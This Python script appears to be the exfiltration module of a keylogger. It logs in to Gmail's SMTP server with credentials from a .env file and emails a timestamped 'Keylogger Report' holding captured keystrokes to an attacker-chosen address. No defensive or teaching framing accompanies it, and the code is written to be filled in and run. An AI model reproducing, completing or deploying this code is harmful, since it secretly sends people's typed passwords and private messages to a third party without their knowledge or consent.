import os
import smtplib
from dotenv import load_dotenv 
import time

# Load environment variables from .env file
load_dotenv() 

EMAIL_USER = os.getenv("EMAIL_USER")
EMAIL_PASS = os.getenv("EMAIL_PASS")

def sendEmail(message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()  # Secure the connection
        server.login(EMAIL_USER, EMAIL_PASS)
        
        recipient = "Enter_Your_MailID"  # Change this to your target email
        subject = "Keylogger Report"
        
        # Construct the email content
        body = f"""Subject: {subject}\n\nKeylogger Report:
        Date and Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
        {message}  # The actual keylogger data/message
        
        """
        server.sendmail(EMAIL_USER, recipient, body)
        server.quit()
        print("[+] Email sent successfully!")
    except Exception as e:
        print(f"[-] Error sending email: {e}")

# Example usage (replace `your_message` with actual data)
sendEmail("Keystrokes logged: abc123")
